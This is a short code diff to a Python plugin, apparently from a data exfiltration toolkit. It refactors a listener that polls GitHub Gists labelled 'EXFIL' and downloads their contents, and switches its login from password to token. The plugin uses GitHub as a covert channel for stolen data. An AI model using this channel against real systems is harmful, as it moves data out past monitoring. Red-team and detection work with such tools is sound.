@@ -15,11 +15,8 @@ def listen():
     app_exfiltrate.log_message('info', "[github] Checking for Gists")
     try:
         while True:
-            gists = g.get_user().get_gists()
-            tmp_gists = []
-            for gist in gists:
-                tmp_gists.append(gist)
-            for gist in tmp_gists[::-1]:
+            gists = list(g.get_user().get_gists())
+            for gist in gists[::-1]:
                 if gist.description == 'EXFIL':
                     url = gist.files['foobar.txt'].raw_data['raw_url']
                     req = requests.get(url)
@@ -40,6 +37,6 @@ def listen():
 class Plugin:
     def __init__(self, app, conf):
         global app_exfiltrate, g
-        g = Github(conf['username'], conf['password'])
+        g = Github(conf['username'], conf['token'])
         app.register_plugin('github_gist', {'send': send, 'listen': listen})
         app_exfiltrate = app
